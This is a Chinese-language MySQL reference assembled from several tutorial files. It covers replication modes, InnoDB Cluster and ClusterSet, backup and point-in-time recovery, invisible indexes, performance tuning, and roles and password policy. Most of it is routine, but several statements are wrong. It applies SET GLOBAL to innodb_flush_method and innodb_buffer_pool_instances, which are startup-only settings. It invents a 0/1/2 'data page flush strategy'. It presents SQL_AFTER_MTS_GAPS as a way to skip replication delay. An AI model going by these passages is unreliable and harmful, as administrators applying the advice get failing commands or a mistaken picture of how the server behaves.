SHOW VARIABLES LIKE 'max_binlog_size';  -- 单个文件最大大小，默认1GB
```

## 2. 异步复制

### 2.1 异步复制架构

异步复制是 MySQL 最基础的复制模式，主库执行事务后立即返回客户端，不等待从库确认接收。

```mermaid
sequenceDiagram
    participant M as 主库 Master
    participant S as 从库 Slave
    Note over M: 1. 事务提交
    M->>S: 2. 写入 binlog
    Note over S: 3. IO 线程拉取 binlog<br/>5. 写入 relay log<br/>6. SQL 线程执行 relay log
    M-->>M: 4. 返回客户端
```

### 2.2 搭建异步复制

```sql
-- ===== 主库配置 =====
-- my.cnf
-- [mysqld]
-- server-id=1
-- log-bin=mysql-bin
-- binlog_format=ROW
-- binlog_do_db=app_db          -- 可选：只复制指定库

-- 创建复制用户
CREATE USER 'repl'@'%' IDENTIFIED WITH caching_sha2_password BY 'ReplP@ss123!';
GRANT REPLICATION SLAVE ON *.* TO 'repl'@'%';

-- 获取主库状态
SHOW MASTER STATUS;
-- 记录 File 和 Position 值

-- ===== 从库配置 =====
-- my.cnf
-- [mysqld]
-- server-id=2
-- relay-log=relay-bin
-- read_only=ON
-- super_read_only=ON          -- 防止超级用户写入

-- 配置复制源
CHANGE REPLICATION SOURCE TO
    SOURCE_HOST='master-host',
    SOURCE_PORT=3306,
    SOURCE_USER='repl',
    SOURCE_PASSWORD='ReplP@ss123!',
    SOURCE_LOG_FILE='mysql-bin.000001',
    SOURCE_LOG_POS=157,
    GET_SOURCE_PUBLIC_KEY=1;   -- caching_sha2_password 需要

-- 启动复制
START REPLICA;  -- MySQL 8.0+ 使用 START REPLICA（替代 START SLAVE）

-- 查看复制状态
SHOW REPLICA STATUS\G
-- 关键字段：
-- Replica_IO_Running: Yes
-- Replica_SQL_Running: Yes
-- Seconds_Behind_Master: 0
-- Last_Error: (空表示无错误)
```

### 2.3 复制过滤

```sql
-- 主库过滤：只记录指定库的 binlog
-- binlog_do_db=app_db
-- binlog_ignore_db=test_db

-- 从库过滤：只应用指定库的 relay log
CHANGE REPLICATION FILTER
    REPLICATE_DO_DB=(app_db),
    REPLICATE_IGNORE_TABLE=(app_db.temp_data),
    REPLICATE_WILD_DO_TABLE=('app_db.log_%');

-- 注意：基于库的过滤可能引发跨库操作问题
-- 推荐使用 REPLICATE_WILD_DO_TABLE 进行表级别过滤
```

## 3. 半同步复制

### 3.1 半同步复制原理

半同步复制要求主库事务提交后，至少一个从库确认接收到该事务的 binlog 事件后，主库才向客户端返回提交成功。

```sql
-- 安装半同步复制插件（主库）
INSTALL PLUGIN rpl_semi_sync_master SONAME 'semisync_master.so';

-- 安装半同步复制插件（从库）
INSTALL PLUGIN rpl_semi_sync_slave SONAME 'semisync_slave.so';

-- 主库配置
SET GLOBAL rpl_semi_sync_master_enabled = ON;
SET GLOBAL rpl_semi_sync_master_timeout = 5000;  -- 超时5秒降级为异步
SET GLOBAL rpl_semi_sync_master_wait_for_replica_count = 1;  -- 至少1个从库确认

-- 从库配置
SET GLOBAL rpl_semi_sync_slave_enabled = ON;

-- 从库重启复制线程以启用半同步
STOP REPLICA;
START REPLICA;

-- 查看半同步状态
SHOW STATUS LIKE 'Rpl_semi_sync_master%';
-- Rpl_semi_sync_master_clients: 当前半同步从库数
-- Rpl_semi_sync_master_status: ON/OFF
-- Rpl_semi_sync_master_no_tx: 未成功半同步的事务数
-- Rpl_semi_sync_master_yes_tx: 成功半同步的事务数
```

### 3.2 半同步复制等待策略

```sql
-- AFTER_SYNC（默认，推荐）：主库将事务写入binlog后等待从库确认，再提交事务
SET GLOBAL rpl_semi_sync_master_wait_point = 'AFTER_SYNC';
-- 优点：从库确认后才提交，不会丢失已提交事务

-- AFTER_COMMIT：主库先提交事务，再等待从库确认
SET GLOBAL rpl_semi_sync_master_wait_point = 'AFTER_COMMIT';
-- 缺点：主库已提交但从库未收到时，其他会话可能看到"幻影"数据
```

## 4. 延迟复制

### 4.1 延迟复制配置

延迟复制让从库故意落后主库指定时间，用于误操作恢复（如误删数据）和读负载分离。

```sql
-- 配置延迟复制（从库落后主库1小时）
CHANGE REPLICATION SOURCE TO
    SOURCE_DELAY = 3600;  -- 延迟3600秒（1小时）

-- 查看延迟状态
SHOW REPLICA STATUS\G
-- SQL_Delay: 3600
-- SQL_Remaining_Delay: 剩余延迟秒数

-- 临时跳过延迟（紧急情况）
START REPLICA UNTIL SQL_AFTER_MTS_GAPS;  -- 跳过多线程复制间隙
```

### 4.2 延迟复制恢复误操作

```sql
-- 场景：主库误删数据，延迟从库尚未执行该操作
-- 1. 停止延迟从库的 SQL 线程
STOP REPLICA SQL_THREAD;

-- 2. 查看 relay log 定位误操作位置
SHOW RELAYLOG EVENTS IN 'relay-bin.000005';

-- 3. 将从库设为可读写
SET GLOBAL read_only = OFF;
SET GLOBAL super_read_only = OFF;

-- 4. 导出误删的数据
SELECT * FROM important_table WHERE id IN (1, 2, 3)
INTO OUTFILE '/tmp/recovery_data.csv';

-- 5. 恢复到主库
-- 在主库执行：LOAD DATA INFILE '/tmp/recovery_data.csv' ...
```

## 5. 组复制 (Group Replication)

### 5.1 组复制概述

组复制基于 Paxos 协议实现多主一致性，提供自动成员管理、故障检测和自动恢复能力。

```sql
-- 组复制配置（每个节点）
-- my.cnf
-- [mysqld]
-- server-id=1
-- log-bin=mysql-bin
-- binlog_format=ROW
-- gtid_mode=ON
-- enforce_gtid_consistency=ON
-- plugin_load_add='group_replication.so'
-- group_replication_group_name='aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee'
-- group_replication_start_on_boot=OFF
-- group_replication_local_address='node1:33061'
-- group_replication_group_seeds='node1:33061,node2:33061,node3:33061'
-- group_replication_bootstrap_group=OFF  -- 仅引导节点设为ON

-- 单主模式（默认）
SET GLOBAL group_replication_single_primary_mode = ON;

-- 多主模式
SET GLOBAL group_replication_single_primary_mode = OFF;
```

### 5.2 启动组复制

```sql
-- 引导节点（第一个节点）
SET GLOBAL group_replication_bootstrap_group = ON;
START GROUP_REPLICATION;
SET GLOBAL group_replication_bootstrap_group = OFF;

-- 其他节点加入
START GROUP_REPLICATION;

-- 查看组成员
SELECT * FROM performance_schema.replication_group_members;
-- +---------------------------+-------------+-------------+--------------+
-- | MEMBER_HOST               | MEMBER_PORT | MEMBER_STATE | MEMBER_ROLE  |
-- +---------------------------+-------------+-------------+--------------+
-- | node1                     |        3306 | ONLINE      | PRIMARY      |
-- | node2                     |        3306 | ONLINE      | SECONDARY    |
-- | node3                     |        3306 | ONLINE      | SECONDARY    |
-- +---------------------------+-------------+-------------+--------------+

-- 查看当前主节点
SELECT * FROM performance_schema.replication_group_members
WHERE MEMBER_ROLE = 'PRIMARY';
```

### 5.3 组复制监控

```sql
-- 查看组复制状态
SELECT * FROM performance_schema.replication_group_member_stats\G

-- 关键指标
-- COUNT_TRANSACTIONS_IN_QUEUE: 等待冲突检测的事务数
-- COUNT_TRANSACTIONS_CHECKED: 已通过冲突检测的事务数
-- COUNT_CONFLICTS_DETECTED: 冲突事务数
-- COUNT_TRANSACTIONS_REMOTE_APPLYING: 远程事务正在应用数
-- TRANSACTIONS_COMMITTED_ALL_MEMBERS: 已在所有成员提交的GTID集

-- 查看组复制事务详情
SELECT * FROM performance_schema.replication_applier_status;
```

## 6. InnoDB Cluster

### 6.1 InnoDB Cluster 架构

InnoDB Cluster 是 MySQL 官方的高可用解决方案，整合了 Group Replication、MySQL Router 和 MySQL Shell。

```mermaid
flowchart TD
    App[Application] --> Router[MySQL Router<br/>读写分离、故障自动切换]
    Router --> Cluster[InnoDB Cluster]
    Cluster --> P[Primary R/W]
    Cluster --> S1[Secondary R/O]
    Cluster --> S2[Secondary R/O]
    Cluster --> GR[Group Replication]
```

### 6.2 使用 MySQL Shell AdminAPI 管理

```javascript
// MySQL Shell (JavaScript 模式)

// 创建 InnoDB Cluster
var cluster = dba.createCluster('prodCluster', {
  memberWeight: 50, // 故障切换优先级
  expelTimeout: 5, // 驱逐超时（秒）
  autoRejoinTries: 3, // 自动重连尝试次数
  consistency: 'BEFORE_ON_PRIMARY_FAILOVER', // 一致性级别
});

// 添加实例
cluster.addInstance('node2:3306', {
  recoveryMethod: 'clone', // 使用克隆恢复数据
  replicationConsistency: 'EVENTUAL',
});

cluster.addInstance('node3:3306', {
  recoveryMethod: 'incremental', // 增量恢复
});

// 查看集群状态
cluster.status();
// 输出包含每个节点的状态、角色、地址信息

// 集群描述
cluster.describe();

// 设置主节点（手动切换）
cluster.setPrimaryInstance('node2:3306');

// 移除实例
cluster.removeInstance('node3:3306');

// 重新加入实例
cluster.rejoinInstance('node3:3306');
```

### 6.3 MySQL Router 配置

```bash
# 引导 MySQL Router（自动生成配置）
mysqlrouter --bootstrap root@node1:3306 --user=mysqlrouter

# 配置文件自动生成在 /etc/mysqlrouter/mysqlrouter.conf
# 关键配置：
# [routing:read_write]
# bind_address=0.0.0.0
# bind_port=6446           # 读写端口
# destinations=metadata-cache://prodCluster/?role=PRIMARY
# routing_strategy=first-available

# [routing:read_only]
# bind_address=0.0.0.0
# bind_port=6447           # 只读端口
# destinations=metadata-cache://prodCluster/?role=SECONDARY
# routing_strategy=round-robin

# 启动 Router
systemctl start mysqlrouter
```

```sql
-- 应用连接方式
-- 写操作 → Router 6446 端口 → Primary 节点
-- 读操作 → Router 6447 端口 → Secondary 节点（轮询）
```

## 7. InnoDB ClusterSet

### 7.1 ClusterSet 架构

ClusterSet 是跨数据中心的灾备方案，将多个 InnoDB Cluster 组成一个集群集，提供全局高可用和灾难恢复能力。

```mermaid
flowchart TD
    subgraph CS[InnoDB ClusterSet]
        subgraph DC1[Primary Cluster DC1]
            P[P] S1[S]
        end
        subgraph DC2[Replica Cluster DC2]
            S2[S] S3[S]
        end
        DC1 -->|异步复制| DC2
    end
```

### 7.2 ClusterSet 管理

```javascript
// MySQL Shell

// 创建 ClusterSet
var cluster = dba.getCluster();
var cs = cluster.createClusterSet('globalCS');

// 添加副本集群
cs.createReplicaCluster('node4:3306', 'replicaCluster', {
  recoveryMethod: 'clone',
  replicationConsistency: 'EVENTUAL',
});

// 查看 ClusterSet 状态
cs.status();

// 灾难切换（主集群不可用时）
cs.forcePrimaryCluster('replicaCluster');

// 计划内切换
cs.setPrimaryCluster('replicaCluster');
```

## 8. GTID 复制

### 8.1 GTID 概念

GTID（Global Transaction Identifier）为每个事务分配全局唯一标识符，简化复制管理和故障恢复。

```sql
-- GTID 格式：server_uuid:transaction_id
-- 例如：3E11FA47-71CA-11E1-9E33-C80AA9429562:1-5

-- 启用 GTID
-- my.cnf
-- gtid_mode=ON
-- enforce_gtid_consistency=ON

-- 查看已执行的 GTID
SHOW MASTER STATUS;
-- Executed_Gtid_Set: 3E11FA47-71CA-11E1-9E33-C80AA9429562:1-100

-- 基于 GTID 配置复制（无需指定 binlog 文件和位置）
CHANGE REPLICATION SOURCE TO
    SOURCE_HOST='master-host',
    SOURCE_PORT=3306,
    SOURCE_USER='repl',
    SOURCE_PASSWORD='ReplP@ss123!',
    SOURCE_AUTO_POSITION=1;  -- 使用 GTID 自动定位
```

### 8.2 GTID 故障恢复

```sql
-- 注入空事务跳过有问题的 GTID
SET GTID_NEXT='3E11FA47-71CA-11E1-9E33-C80AA9429562:101';
BEGIN;
COMMIT;
SET GTID_NEXT='AUTOMATIC';

-- 重置从库的 GTID 执行位置
RESET MASTER;  -- 危险操作，仅在新从库上使用

-- 查看从库已检索的 GTID
SHOW REPLICA STATUS\G
-- Retrieved_Gtid_Set: 已从主库拉取的 GTID
-- Executed_Gtid_Set: 已执行的 GTID
```

## 9. 备份与恢复

### 9.1 mysqldump 逻辑备份

```bash
# 全库逻辑备份
mysqldump -u root -p --single-transaction --routines --triggers --events \
    --all-databases > full_backup.sql

# 单库备份
mysqldump -u root -p --single-transaction app_db > app_db_backup.sql

# 仅表结构
mysqldump -u root -p --no-data app_db > schema_only.sql

# 仅数据
mysqldump -u root -p --no-create-info app_db > data_only.sql

# 压缩备份
mysqldump -u root -p --single-transaction app_db | gzip > app_db.sql.gz

# 恢复
mysql -u root -p app_db < app_db_backup.sql
gunzip < app_db.sql.gz | mysql -u root -p app_db
```

```sql
-- --single-transaction：使用一致性快照，不锁表（InnoDB 推荐）
-- --routines：包含存储过程和函数
-- --triggers：包含触发器
-- --events：包含事件
-- --set-gtid-purged=OFF：不输出 GTID 信息（用于非 GTID 环境）
-- --where：条件导出
```

### 9.2 mysqlpump 并行逻辑备份

```bash
# 并行备份（MySQL 8.0+）
mysqlpump -u root -p --default-parallelism=4 \
    --single-transaction app_db > app_db_pump.sql

# 按库并行
mysqlpump -u root -p --parallel-schemas=4:app_db \
    --parallel-schemas=2:log_db \
    --single-transaction > multi_db.sql

# 压缩输出
mysqlpump -u root -p --compress-output=LZ4 \
    --single-transaction app_db > app_db.sql.lz4
```

### 9.3 MySQL Enterprise Backup 物理备份

```bash
# 全量物理备份
mysqlbackup --user=root --password --backup-dir=/backup/full \
    backup

# 增量备份
mysqlbackup --user=root --password --backup-dir=/backup/incr \
    --incremental --incremental-base=dir:/backup/full \
    backup

# 恢复
mysqlbackup --backup-dir=/backup/full copy-back
# 恢复前需确保数据目录为空

# 压缩备份
mysqlbackup --user=root --password --backup-dir=/backup/compressed \
    --compress backup
```

### 9.4 基于时间点的恢复 (PITR)

```bash
# 1. 先恢复全量备份
mysql -u root -p < full_backup.sql

# 2. 查看全量备份后的 binlog 文件
head -20 full_backup.sql | grep 'MASTER_DATA'

# 3. 从 binlog 中提取指定时间段的操作
mysqlbinlog --start-datetime="2024-12-01 00:00:00" \
    --stop-datetime="2024-12-01 14:30:00" \
    mysql-bin.000010 mysql-bin.000011 | mysql -u root -p

# 4. 或基于位置提取
mysqlbinlog --start-position=157 --stop-position=1024 \
    mysql-bin.000010 | mysql -u root -p
```

```sql
-- 查看误操作的时间点
SHOW BINLOG EVENTS IN 'mysql-bin.000010'
FROM 157 LIMIT 100;

-- 跳过误操作（基于 GTID）
-- 找到误操作的 GTID 后注入空事务跳过
SET GTID_NEXT='3E11FA47-71CA-11E1-9E33-C80AA9429562:50';
BEGIN;
COMMIT;
SET GTID_NEXT='AUTOMATIC';
```

### 9.5 备份策略建议

| 策略         | 频率 | 工具                                  | 保留周期 |
| :----------- | :--- | :------------------------------------ | :------- |
| 全量逻辑备份 | 每日 | mysqldump                             | 7天      |
| 全量物理备份 | 每周 | MySQL Enterprise Backup               | 4周      |
| 增量物理备份 | 每日 | MySQL Enterprise Backup               | 7天      |
| Binlog 备份  | 实时 | mysqlbinlog --read-from-remote-server | 7天      |
| 延迟从库     | 实时 | 延迟复制                              | 持续运行 |

```sql
-- 自动化备份验证：定期检查备份可恢复性
-- 在测试环境恢复备份并执行校验查询
SELECT COUNT(*) FROM critical_table;
CHECK TABLE critical_table;
```

<!-- ============ 文档分隔线：020-mysql/060-InvisibleIndex.md ============ -->

## 1. 不可见索引概述

不可见索引（Invisible Index）对优化器不可见，但仍然被维护（INSERT/UPDATE/DELETE 仍更新索引）。

## 2. 语法

```sql
-- 创建不可见索引
CREATE INDEX idx_name ON employees(name) INVISIBLE;

-- 修改索引可见性
ALTER TABLE employees ALTER INDEX idx_name INVISIBLE;
ALTER TABLE employees ALTER INDEX idx_name VISIBLE;

-- 查看索引可见性
SELECT index_name, is_visible
FROM information_schema.statistics
WHERE table_name = 'employees';
```

## 3. 使用场景

### 3.1 安全删除索引

```sql
-- 步骤1：将索引设为不可见
ALTER TABLE employees ALTER INDEX idx_old INVISIBLE;

-- 步骤2：观察一段时间，确认无性能问题
-- 如果出现问题，快速恢复
ALTER TABLE employees ALTER INDEX idx_old VISIBLE;

-- 步骤3：确认安全后删除
DROP INDEX idx_old ON employees;
```

### 3.2 灰度测试新索引

```sql
-- 创建不可见的新索引
CREATE INDEX idx_new ON employees(dept_id, salary) INVISIBLE;

-- 特定会话测试
SET SESSION optimizer_switch = 'use_invisible_indexes=on';
EXPLAIN SELECT * FROM employees WHERE dept_id = 5 ORDER BY salary;
-- 可以使用新索引

-- 其他会话不受影响
```

## 4. 注意事项

```sql
-- 不可见索引仍被维护，写入开销不变
-- 主键索引不能设为不可见
-- UNIQUE 约束索引设为不可见后，约束仍然生效
```

<!-- ============ 文档分隔线：020-mysql/061-PerformanceTuningSecurity.md ============ -->

## 1. 缓冲池配置与优化

### 1.1 Buffer Pool 大小规划

Buffer Pool 是 InnoDB 最重要的内存区域，缓存数据页和索引页，直接影响查询性能。

```sql
-- 查看当前 Buffer Pool 大小
SHOW VARIABLES LIKE 'innodb_buffer_pool_size';

-- 设置 Buffer Pool 大小（建议物理内存的 60%-80%）
-- 专用数据库服务器（16GB 内存）
SET GLOBAL innodb_buffer_pool_size = 10737418240;  -- 10GB

-- 动态调整（MySQL 5.7+ 支持在线调整）
-- 调整以 chunk 为单位，chunk 大小 = innodb_buffer_pool_chunk_size
SHOW VARIABLES LIKE 'innodb_buffer_pool_chunk_size';  -- 默认128MB

-- 查看 Buffer Pool 实例数
SHOW VARIABLES LIKE 'innodb_buffer_pool_instances';
-- 建议：Buffer Pool >= 1GB 时，每个实例管理 1GB
SET GLOBAL innodb_buffer_pool_instances = 8;
```

### 1.2 Buffer Pool 预热与转储

```sql
-- 启用 Buffer Pool 转储（关闭时保存热点页列表）
SET GLOBAL innodb_buffer_pool_dump_at_shutdown = ON;  -- 默认ON

-- 启动时自动加载热点页
SET GLOBAL innodb_buffer_pool_load_at_startup = ON;   -- 默认ON

-- 手动转储/加载 Buffer Pool
SET GLOBAL innodb_buffer_pool_dump_now = ON;
SET GLOBAL innodb_buffer_pool_load_now = ON;

-- 查看转储/加载进度
SHOW STATUS LIKE 'Innodb_buffer_pool_dump_status';
SHOW STATUS LIKE 'Innodb_buffer_pool_load_status';
```

### 1.3 Buffer Pool 命中率监控

```sql
-- 计算命中率
SELECT
    Variable_name, Variable_value
FROM performance_schema.global_status
WHERE Variable_name IN (
    'Innodb_buffer_pool_read_requests',
    'Innodb_buffer_pool_reads'
);

-- 命中率 = 1 - Innodb_buffer_pool_reads / Innodb_buffer_pool_read_requests
-- 目标：> 99%
-- 低于 95% 需要增大 Buffer Pool 或优化查询

-- 查看各表的缓冲使用情况
SELECT
    OBJECT_SCHEMA AS db,
    OBJECT_NAME AS table_name,
    COUNT(*) AS pages_cached,
    SUM(IF(DATA_SIZE > 0, 1, 0)) AS pages_with_data
FROM performance_schema.innodb_buffer_page
GROUP BY OBJECT_SCHEMA, OBJECT_NAME
ORDER BY pages_cached DESC
LIMIT 20;
```

## 2. 日志文件与刷新策略

### 2.1 Redo Log 配置

```sql
-- 查看 redo log 配置
SHOW VARIABLES LIKE 'innodb_log%';

-- MySQL 8.0.30+ 动态调整 redo log 容量
ALTER INSTANCE SET GLOBAL innodb_redo_log_capacity = 4294967296;  -- 4GB

-- redo log 容量建议：
-- 写密集型：每秒写入量的 1-2 小时容量
-- 一般场景：1-2GB 足够

-- 查看 redo log 使用情况
SHOW VARIABLES LIKE 'innodb_redo_log_capacity';

-- 监控 redo log 刷新频率
SHOW GLOBAL STATUS LIKE 'Innodb_os_log_written';
-- 两次采样差值 / 时间间隔 = 每秒写入量
```

### 2.2 刷盘策略

```sql
-- Redo Log 刷盘策略（最关键参数之一）
-- 0: 每秒刷盘（可能丢失1秒数据，性能最好）
-- 1: 每次事务提交刷盘（最安全，默认，性能最差）
-- 2: 每次提交写入OS缓存，每秒fsync（折中方案）
SET GLOBAL innodb_flush_log_at_trx_commit = 1;  -- 生产环境推荐1

-- 数据页刷盘策略
-- 0: 脏页由后台线程定期刷新
-- 1: 每次事务提交刷新脏页（最安全但性能极差）
-- 2: 每次提交写入OS缓存，由OS决定何时fsync
SET GLOBAL innodb_flush_method = 'O_DIRECT';  -- Linux推荐，绕过OS缓存

-- IO 容量配置
SET GLOBAL innodb_io_capacity = 10000;          -- SSD 环境
SET GLOBAL innodb_io_capacity_max = 20000;       -- 最大刷新速率
SET GLOBAL innodb_flush_sync = OFF;              -- 避免 checkpoint 影响查询
```

## 3. 慢查询日志分析

### 3.1 慢查询日志配置

```sql
-- 启用慢查询日志
SET GLOBAL slow_query_log = ON;
SET GLOBAL long_query_time = 1;            -- 超过1秒记录（默认10秒）
SET GLOBAL log_queries_not_using_indexes = ON;  -- 记录未使用索引的查询
SET GLOBAL min_examined_row_limit = 100;   -- 至少扫描100行才记录

-- 慢查询日志输出位置
SET GLOBAL slow_query_log_file = '/var/log/mysql/slow.log';
-- 或写入表（方便查询分析）
SET GLOBAL log_output = 'TABLE';

-- 查看慢查询日志表
SELECT * FROM mysql.slow_log ORDER BY start_time DESC LIMIT 10;

-- 查看慢查询配置
SHOW VARIABLES LIKE 'slow_query%';
SHOW VARIABLES LIKE 'long_query_time';
```

### 3.2 mysqldumpslow 分析工具

```bash
# 按查询时间排序，显示前10条
mysqldumpslow -s t -t 10 /var/log/mysql/slow.log

# 按查询次数排序
mysqldumpslow -s c -t 10 /var/log/mysql/slow.log

# 按平均查询时间排序
mysqldumpslow -s at -t 10 /var/log/mysql/slow.log

# 按锁定时间排序
mysqldumpslow -s l -t 10 /var/log/mysql/slow.log

# 按返回记录数排序
mysqldumpslow -s r -t 10 /var/log/mysql/slow.log

# 常用参数：
# -s: 排序方式 (t=时间, c=次数, l=锁时间, r=返回记录, at=平均时间)
# -t: 显示前N条
# -g: 匹配模式（类似grep）
mysqldumpslow -s t -t 5 -g 'SELECT' /var/log/mysql/slow.log
```

### 3.3 慢查询优化案例

```sql
-- 案例1：全表扫描 → 添加索引
-- 慢查询：
SELECT * FROM orders WHERE customer_id = 1001;
-- EXPLAIN: type=ALL, rows=1000000

-- 优化：
CREATE INDEX idx_customer ON orders(customer_id);
-- EXPLAIN: type=ref, rows=50

-- 案例2：索引列使用函数 → 函数索引
-- 慢查询：
SELECT * FROM users WHERE YEAR(created_at) = 2024;
-- EXPLAIN: type=ALL

-- 优化：
CREATE INDEX idx_year ON users ((YEAR(created_at)));
-- 或改写查询：
SELECT * FROM users
WHERE created_at >= '2024-01-01' AND created_at < '2025-01-01';

-- 案例3：OR 条件导致索引失效 → UNION 优化
-- 慢查询：
SELECT * FROM orders WHERE customer_id = 1001 OR status = 'urgent';

-- 优化：
SELECT * FROM orders WHERE customer_id = 1001
UNION
SELECT * FROM orders WHERE status = 'urgent' AND customer_id != 1001;
```

## 4. Performance Schema

### 4.1 启用与配置

```sql
-- 查看 Performance Schema 是否启用
SHOW VARIABLES LIKE 'performance_schema';

-- 启用（需重启）
-- my.cnf: performance_schema=ON

-- 查看可用的事件类型
SELECT * FROM performance_schema.setup_instruments
WHERE NAME LIKE 'statement/%' LIMIT 10;

-- 启用/禁用特定监控项
UPDATE performance_schema.setup_instruments
SET ENABLED = 'YES', TIMED = 'YES'
WHERE NAME LIKE 'statement/%';

UPDATE performance_schema.setup_consumers
SET ENABLED = 'YES'
WHERE NAME IN ('events_waits_current', 'events_statements_current');
```

### 4.2 语句分析

```sql
-- 查看执行时间最长的 SQL
SELECT
    DIGEST_TEXT AS query,
    COUNT_STAR AS exec_count,
    ROUND(SUM_TIMER_WAIT / 1000000000000, 3) AS total_time_sec,
    ROUND(AVG_TIMER_WAIT / 1000000000, 3) AS avg_time_ms,
    ROUND(MAX_TIMER_WAIT / 1000000000, 3) AS max_time_ms,
    SUM_ROWS_EXAMINED AS total_rows_examined,
    SUM_ROWS_SENT AS total_rows_sent
FROM performance_schema.events_statements_summary_by_digest
ORDER BY SUM_TIMER_WAIT DESC
LIMIT 10;

-- 查看全表扫描的 SQL
SELECT
    DIGEST_TEXT AS query,
    COUNT_STAR AS exec_count,
    SUM_NO_INDEX_USED AS no_index_count,
    SUM_NO_GOOD_INDEX_USED AS no_good_index_count
FROM performance_schema.events_statements_summary_by_digest
WHERE SUM_NO_INDEX_USED > 0
ORDER BY SUM_NO_INDEX_USED DESC
LIMIT 10;
```

### 4.3 等待事件分析

```sql
-- 查看最耗时的等待事件
SELECT
    EVENT_NAME,
    COUNT_STAR AS wait_count,
    ROUND(SUM_TIMER_WAIT / 1000000000, 3) AS total_time_ms,
    ROUND(AVG_TIMER_WAIT / 1000000, 3) AS avg_time_us
FROM performance_schema.events_waits_summary_global_by_event_name
WHERE COUNT_STAR > 0
ORDER BY SUM_TIMER_WAIT DESC
LIMIT 10;

-- 查看文件 I/O 等待
SELECT
    EVENT_NAME,
    COUNT_READ, COUNT_WRITE,
    ROUND(SUM_TIMER_READ / 1000000000, 3) AS read_time_ms,
    ROUND(SUM_TIMER_WRITE / 1000000000, 3) AS write_time_ms
FROM performance_schema.file_summary_by_event_name
WHERE COUNT_READ > 0 OR COUNT_WRITE > 0
ORDER BY SUM_TIMER_READ + SUM_TIMER_WRITE DESC
LIMIT 10;
```

## 5. Sys Schema

### 5.1 Sys Schema 概述

Sys Schema 基于 Performance Schema 和 Information Schema 提供更友好的视图，简化性能分析。

```sql
-- 查看最耗时的 SQL（按总时间）
SELECT * FROM sys.statements_with_runtimes_in_95th_percentile\G

-- 查看全表扫描的 SQL
SELECT * FROM sys.statements_with_full_table_scans\G

-- 查看使用临时表的 SQL
SELECT * FROM sys.statements_with_temp_tables\G

-- 查看 Buffer Pool 各表使用情况
SELECT * FROM sys.innodb_buffer_stats_by_table
ORDER BY pages DESC LIMIT 10;

-- 查看各表等待情况
SELECT * FROM sys.io_global_by_file_by_bytes
ORDER BY total DESC LIMIT 10;
```

### 5.2 常用 Sys Schema 视图

```sql
-- 查看冗余索引
SELECT * FROM sys.schema_redundant_indexes\G

-- 查看未使用的索引
SELECT * FROM sys.schema_unused_indexes;

-- 查看索引使用统计
SELECT * FROM sys.schema_index_statistics
ORDER BY rows_selected DESC LIMIT 10;

-- 查看会话连接信息
SELECT * FROM sys.session
WHERE command != 'Daemon'
ORDER BY current_statement_latency DESC;

-- 查看内存使用
SELECT * FROM sys.memory_global_by_current_bytes
ORDER BY current_alloc DESC LIMIT 10;

-- 查看进程列表（增强版）
SELECT conn_id, user, db, command, current_statement,
       statement_latency, lock_latency
FROM sys.session
WHERE command = 'Query'
ORDER BY statement_latency DESC;
```

## 6. 索引优化提示

### 6.1 USE INDEX / FORCE INDEX / IGNORE INDEX

```sql
-- USE INDEX：建议优化器使用指定索引（优化器可能忽略）
SELECT * FROM orders USE INDEX (idx_customer_date)
WHERE customer_id = 1001 AND order_date >= '2024-01-01';

-- FORCE INDEX：强制使用指定索引
SELECT * FROM orders FORCE INDEX (idx_customer_date)
WHERE customer_id = 1001;

-- IGNORE INDEX：忽略指定索引
SELECT * FROM orders IGNORE INDEX (idx_status)
WHERE customer_id = 1001 OR status = 'shipped';

-- 多索引选择
SELECT * FROM orders USE INDEX (idx_customer, idx_date)
WHERE customer_id = 1001 OR order_date >= '2024-01-01';
```

### 6.2 优化器开关

```sql
-- 查看优化器开关
SHOW VARIABLES LIKE 'optimizer_switch';

-- 禁用索引合并
SET SESSION optimizer_switch = 'index_merge=off';

-- 启用 MRR (Multi-Range Read)
SET SESSION optimizer_switch = 'mrr=on,mrr_cost_based=off';

-- 启用 ICP (Index Condition Pushdown)
SET SESSION optimizer_switch = 'index_condition_pushdown=on';

-- 启用 BKA (Batched Key Access)
SET SESSION optimizer_switch = 'batched_key_access=on';
```

## 7. 安全机制

### 7.1 caching_sha2_password 认证

MySQL 8.0+ 默认使用 `caching_sha2_password` 认证插件，比旧的 `mysql_native_password` 更安全。

```sql
-- 查看用户认证方式
SELECT user, host, plugin FROM mysql.user;

-- 创建使用 caching_sha2_password 的用户
CREATE USER 'app_user'@'%' IDENTIFIED WITH caching_sha2_password BY 'StrongP@ss123!';

-- 修改已有用户的认证方式
ALTER USER 'old_user'@'%' IDENTIFIED WITH caching_sha2_password BY 'NewP@ss456!';

-- 连接时需要 SSL 或 RSA 公钥
-- JDBC 连接参数：allowPublicKeyRetrieval=true&useSSL=true

-- 兼容旧客户端（不推荐用于生产）
ALTER USER 'legacy_user'@'%' IDENTIFIED WITH mysql_native_password BY 'password';
```

### 7.2 角色管理

```sql
-- 创建角色
CREATE ROLE 'app_read', 'app_write', 'app_admin';

-- 为角色授权
GRANT SELECT ON app_db.* TO 'app_read';
GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'app_write';
GRANT ALL ON app_db.* TO 'app_admin';

-- 创建用户并赋予角色
CREATE USER 'reader'@'%' IDENTIFIED BY 'ReaderP@ss1!';
CREATE USER 'writer'@'%' IDENTIFIED BY 'WriterP@ss1!';
CREATE USER 'admin_user'@'%' IDENTIFIED BY 'AdminP@ss1!';

GRANT 'app_read' TO 'reader'@'%';
GRANT 'app_write' TO 'writer'@'%';
GRANT 'app_admin' TO 'admin_user'@'%';

-- 用户激活角色
SET ROLE 'app_read';

-- 设置默认角色（登录时自动激活）
ALTER USER 'reader'@'%' DEFAULT ROLE 'app_read';
ALTER USER 'writer'@'%' DEFAULT ROLE 'app_write';

-- 查看角色授权
SHOW GRANTS FOR 'reader'@'%';
SHOW GRANTS FOR 'reader'@'%' USING 'app_read';

-- 撤销角色
REVOKE 'app_write' FROM 'writer'@'%';

-- 删除角色
DROP ROLE 'app_admin';
```

### 7.3 密码策略与过期

```sql
-- 查看密码策略
SHOW VARIABLES LIKE 'validate_password%';
-- validate_password.policy: 0=LOW, 1=MEDIUM, 2=STRONG
-- validate_password.length: 最小密码长度
-- validate_password.mixed_case_count: 大小写字母数
-- validate_password.number_count: 数字数
-- validate_password.special_char_count: 特殊字符数

-- 设置密码策略
SET GLOBAL validate_password.policy = 1;    -- MEDIUM
SET GLOBAL validate_password.length = 12;

-- 设置密码过期
CREATE USER 'temp_user'@'%' IDENTIFIED BY 'TempP@ss1!' PASSWORD EXPIRE INTERVAL 90 DAY;
ALTER USER 'app_user'@'%' PASSWORD EXPIRE INTERVAL 180 DAY;

